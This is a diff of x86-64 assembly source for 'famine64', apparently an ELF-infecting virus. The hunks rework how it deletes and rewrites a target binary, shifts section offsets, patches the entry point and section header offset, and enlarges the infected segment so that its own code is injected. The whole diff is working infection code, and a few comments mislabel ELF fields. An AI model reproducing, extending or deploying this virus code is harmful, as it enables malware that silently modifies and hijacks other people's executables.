@@ -300,9 +300,11 @@ check_signature:
 
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;; 4. Erase file from system tree before any changes !!!
+	;; 
 	;;    int unlink(char *pathname)
+	;; 
+	;;    RDI already contains *path.
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	;;  rdi already contains *path
 	mov 	rax, SYS_UNLINK
 	syscall
 	cmp 	rax, 0
@@ -320,37 +322,48 @@ check_signature:
 	;;   d. Change the infected Segment flags
 	;;   e. Change the infected segment memory size
 	;; 
-	;;   r8  : Segment we infect.
-	;;   rcx : Elf Header.
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	;; a-1. Get the Section Header Table (SHT)
+	;; a-1. Get the offset of the SHT in file                 : R9
+	;;      Get the Section Header Table (SHT) entry address  : RAX
+	;;      Get the SHT end address                           : RCX
+	;;      Get the end offset of the infected segment        : R10
+	;; 
+	;;      RDX contains Elf Header
+	;;      R8 contains infected Program Header Segment
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	mov 	r9, QWORD [rdx + 40] 	; ->e_shoff (size: 4)
+	lea 	rax, [rdx + r9] 	 	; pointer to first section of SHT
 	xor 	rcx, rcx
 	movzx	ecx, WORD [rdx + 60]  	; ->e_shnum (size: 2)
-	mov 	r9, QWORD [rdx + 40] 	; ->e_shoff (size: 4)
-	lea 	rax, [rdx + r9] 	 	; pointer to first segment of SHT
 	imul	rcx, rcx, 64 			; total size of SHT (64: sizeof Elf64_Shdr)
 	add 	rcx, r9 	 	 		; offset to the end of SHT
 	add 	rcx, rdx 	 			; address of the end of SHT
-	mov 	r9, QWORD [r8 + 8] 		; store the infected segment offset (+8: ->p_offset)
-	add 	r9, QWORD [r8 + 40] 	; add to it its size (+40: ->p_memsz)
+	mov 	r10, QWORD [r8 + 8]		; store ->p_offset
+	add 	r10, QWORD [r8 + 32]	; add   ->p_filesz
 
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	;; a-2. Iterate over Sections to modify those higher than our infected segment (IS)
+	;; a-2. Iterate over Sections Header
+	;;      Find sections higher in file than our infected section offset
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;	
-find_higher_sections:
-	xor 	r10, r10
-	mov 	r10, QWORD [rax + 24]  	; store section offset
-	cmp 	r10, r9  	 			; compare if greater than the IS offset + size
+sections_iteration:
+	mov 	r11, QWORD [rax + 24]  	; store ->sh_offset
+	cmp 	r11, r10  	 			; check if the section is higher than the infected section
 	jl  	next_section
-	add 	r10d, [rel famine64_size] ; If it is, add to section offset our code size
-	mov 	QWORD [rax + 24], r10
+	mov 	r11, QWORD [r8 + 16] 	; compare infected->p_vaddr >= section->sh_addr
+	cmp 	QWORD [rax + 16], r11
+	jge 	next_section
+	add 	r11, QWORD [r8 + 32] 	; compare inf->p_vaddr + inf->p_filez < section->sh_addr
+	cmp 	QWORD [rax + 16], r11
+	jg  	next_section
+	xor 	r11, r11 				; modify section offset
+	mov 	r11d, DWORD [rel famine64_size]
+	add 	QWORD [rax + 24], r11
 next_section:
 	add 	rax, 64 	 	 		; move to next section
-	cmp 	rcx, rax 	 			; check if we are at the end of it
-	jl  	find_higher_sections
+	cmp 	rax, rcx 	 			; check if we are at the end of SHT
+	jl  	sections_iteration
 
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;; b. Modify Program Entry Point
@@ -366,7 +379,7 @@ next_section:
 	;; c. Modify Section Header Table offset
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;	
 	xor 	r10, r10
-	mov 	r10d, [rel famine64_size] 	; store our program size
+	mov 	r10d, DWORD [rel famine64_size]
 	add 	QWORD [rdx + 40], r10 		; modify the Section Header table offset
 
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
@@ -385,8 +398,8 @@ next_section:
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;	
 modify_sht_memsize:
 	add 	QWORD [r8 + 40], r10  	; change segment memory size
-	mov 	r10, QWORD [r8 + 40]
-	mov 	QWORD [r8 + 32], r10  	; change segment file size
+	;mov 	r10, QWORD [r8 + 40]
+	add 	QWORD [r8 + 32], r10  	; change segment file size
 
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;; 6. Rewrite the program
@@ -406,7 +419,7 @@ modify_sht_memsize:
 	mov 	QWORD [rsp + 12], rsi  		; store the program size
 	mov 	QWORD [rsp + 20], rax 		; store the original program entry point
 	mov 	rax, QWORD [r8 + 8] 		; store infected->p_offset
-	add 	rax, QWORD [r8 + 40] 		;     + infected->p_filesz
+	add 	rax, QWORD [r8 + 32] 		;     + infected->p_memsz
 	sub 	eax, [rel famine64_size]	;     - famine64_size
 	mov 	QWORD [rsp + 28], rax
 	lea 	rdi, [rdi]			  		; load file_path address
